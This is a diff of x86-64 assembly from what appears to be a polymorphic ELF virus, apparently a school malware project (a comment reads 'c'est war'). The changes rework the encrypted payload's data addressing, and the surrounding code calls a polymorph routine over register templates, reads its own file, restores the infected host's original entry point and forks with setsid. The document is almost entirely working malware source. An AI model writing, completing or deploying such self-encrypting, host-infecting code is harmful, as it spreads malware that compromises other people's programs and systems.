@@ -1,7 +1,10 @@
 _encrypted_start:
 
     PUSH_ALL
-	lea		rdi, [rel path]
+
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.path
+
 	mov		rcx, 512
 	xor		rax, rax
 	NOP
@@ -9,7 +12,11 @@ _encrypted_start:
 	NOP
 	NOP
 	rep		stosq
-	lea		rax, [rel path]
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.path
+	;lea		rax, [rel path]
+
 	mov		[rax], byte '/'
 	inc		rax
 	mov		[rax], byte 't'
@@ -38,30 +45,40 @@ _encrypted_start:
 	;lea		rdi, [rel _stop]
 
 
-	lea		rdx, [rel templates_rdi]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rdi
 	mov		r8, 7
 	mov		r9, 4
 	call	polymorph
-	lea		rdx, [rel templates_rax]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rax
 	call	polymorph
-	lea		rdx, [rel templates_rsi]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rsi
 	call	polymorph
-	lea		rdx, [rel templates_rdx]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rdx
 	call	polymorph
-	lea		rdx, [rel templates_rcx]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rcx
 	call	polymorph
-	lea		rdx, [rel templates_r10]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r10
 	call	polymorph
-	lea		rdx, [rel templates_r11]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r11
 	call	polymorph
-	lea		rdx, [rel templates_r13]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r13
 	call	polymorph
-	lea		rdx, [rel templates_r15]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r15
 	call	polymorph
 
 
 	mov		rax, SYS_open
-	lea		rdi, [rel self]
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.self
 	xor		rsi, rsi
 	NOP
 	NOP
@@ -79,7 +96,8 @@ _encrypted_start:
 	mov		r12, rax
 	mov		rax, SYS_pread64
 	mov		rdi, r12
-	lea		rsi, [rel zero]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.zero
 	mov		rdx, 1
 	mov		r10, 10
 	syscall
@@ -90,7 +108,10 @@ _encrypted_start:
 	syscall
 
 	POP_ALL
-	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est war
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.zero
+	mov		al, BYTE [rax]	; SI ICI = 0, ca signfiie c'est war
 	test	al, al
 	jz		.continue
 
@@ -99,20 +120,34 @@ _encrypted_start:
 	cmp		eax, 0
 	jng		.continue_fork
 
-	mov		rax, [rel entry]
-	mov		[rel new_entry], rax
-	mov		rax, [rel new_entry]
-	sub		rax, [rel old_entry]
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.entry
+	mov		rax, [rax]
+
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.new_entry
+	mov		[rdi], rax
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.new_entry
+	mov		rax, [rax]
+
+	mov		rdi, [rbp + 16]
+	add		rdi, mydata.old_entry
+	sub		rax, [rdi]
 
 	mov		rdi, [rbp + 8]
 	;lea		rdi, [rel _start]
 
 
 	sub		rdi, rax
-	mov		[rel new_entry], rdi
+	mov		rax, [rbp + 16]
+	add		rax, mydata.new_entry
+	mov		[rax], rdi
 
 	add		rsp, 64
-	jmp		[rel new_entry]
+	jmp		[rax]
 
 .continue_fork:
 	mov		rax, SYS_setsid
